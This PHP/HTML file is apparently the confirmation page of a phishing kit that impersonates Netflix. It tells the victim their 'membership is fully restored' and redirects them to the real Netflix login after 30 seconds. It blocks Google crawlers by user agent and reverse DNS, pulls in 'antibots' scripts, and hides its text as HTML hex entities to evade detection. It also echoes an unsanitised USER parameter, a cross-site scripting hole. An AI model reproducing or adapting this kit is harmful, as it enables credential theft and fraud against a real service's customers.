<?php 
session_start();
error_reporting(0); 
include "../bots/antibots1.php";
include "../bots/antibots2.php";
include "../bots/antibots3.php";
include "../bots/antibots4.php";
include "../bots/antibots5.php";
include "../bots/antibots6.php";
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>&#x53;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;</title>
<meta content="" name="keywords">
<meta content="" name="description">
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
<meta http-equiv="refresh" content="30;url=https://www.netflix.com/login" />
<link rel="shortcut icon" href="../../images/icon1.ico">
<link rel="apple-touch-icon" href="../../images/icon2.png">
<link type="text/css" rel="stylesheet" href="../../css/none.css">
<style>
.header-logo{
	width:167px;
	height:45px;
	padding-top:20px;
	position: absolute;
}


@media screen and (max-width: 504px){
.header-logo{
         width:75px;
	height:20px;
		position: absolute;
		padding-top:20px;
    }
}
@media screen and (max-width: 740px) {
.header-logo{
    width:167px;
	height:45px;
	padding-top:25px;
	position: absolute;
    }
}
@media screen and (max-width: 440px){
.header-logo{
         width:75px;
	height:20px;
		position: absolute;
		padding-top:20px;
    }
}
@media screen and (max-width: 700px) {
.header-logo{
         width:75px;
	height:20px;
    }
}
@media screen and (min-width: 1024px) {
   .header-logo{
    width:167px;
	height:45px;
	padding-top:25px;
	position: absolute;
    }
}
</style>
</head>
<body>
<div id="appMountPoint">
<div class="login-wrapper">
<div class="nfHeader login-header signupBasicHeader"><a href="#" class="svg-nfLogo signupBasicHeader"><img class="header-logo" src="../../images/logo.png"></a></div>
<div class="login-body">
<div class="login-content login-form">
<div class="logout">
<h1 class="logout-title">&#x43;&#x6F;&#x6E;&#x67;&#x72;&#x61;&#x74;&#x75;&#x6C;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x21;</h1>
<p class="logout-body">&#x44;&#x65;&#x61;&#x72; <?php
echo $_GET['USER']; ?> &#x79;&#x6F;&#x75;&#x72;&#x20;&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;&#x20;&#x6D;&#x65;&#x6D;&#x62;&#x65;&#x72;&#x73;&#x68;&#x69;&#x70;&#x20;&#x69;&#x73;&#x20;&#x66;&#x75;&#x6C;&#x6C;&#x79;&#x20;&#x72;&#x65;&#x73;&#x74;&#x6F;&#x72;&#x65;&#x64;.</p>
<p class="logout-body">&#x59;&#x6F;&#x75;&#x20;&#x77;&#x69;&#x6C;&#x6C;&#x20;&#x62;&#x65;&#x20;&#x72;&#x65;&#x64;&#x69;&#x72;&#x65;&#x63;&#x74;&#x65;&#x64;&#x20;&#x74;&#x6F;&#x20;&#x74;&#x68;&#x65;&#x20;&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;&#x20;&#x68;&#x6F;&#x6D;&#x65;&#x20;&#x70;&#x61;&#x67;&#x65;&#x20;&#x69;&#x6E;&#x20;&#x33;&#x30;&#x20;&#x73;&#x65;&#x63;&#x6F;&#x6E;&#x64;&#x73;.</p>
<a class="btn btn-logout btn-blue btn-large" target="_self" href="https://www.netflix.com/login" style="width:100%">&#x43;&#x6F;&#x6E;&#x74;&#x69;&#x6E;&#x75;&#x65;</a>
</div></div></div>
<div class="site-footer-wrapper login-footer">
<div class="footer-divider"></div><div class="site-footer">
<p class="footer-top"><a class="footer-top-a" href="#">&#x51;&#x75;&#x65;&#x73;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x3F;&#x20;&#x43;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74;&#x20;&#x75;&#x73;.</a></p><ul class="footer-links structural"><li class="footer-link-item"><a class="footer-link" href="#"><span>&#x47;&#x69;&#x66;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x54;&#x65;&#x72;&#x6D;&#x73;</span></a></li><li class="footer-link-item"><a class="footer-link" href="#"><span>&#x54;&#x65;&#x72;&#x6D;&#x73;&#x20;&#x6F;&#x66;&#x20;&#x55;&#x73;&#x65;</span></a></li><li class="footer-link-item"><a class="footer-link" href="#"><span>&#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x53;&#x74;&#x61;&#x74;&#x65;&#x6D;&#x65;&#x6E;&#x74;</span></a></li></ul>
<div class="lang-selection-container" id="lang-switcher">
<div class="ui-select-wrapper"><label class="ui-label no-display">
<span class="ui-label-text"></span></label>
<div class="select-arrow medium prefix globe">
<select class="ui-select medium">
<option selected="" value="">&#x45;&#x6E;&#x67;&#x6C;&#x69;&#x73;&#x68;</option></select>
</div></div></div>
<p class="copy-text"></p></div></div>
</div></div>
</body></html>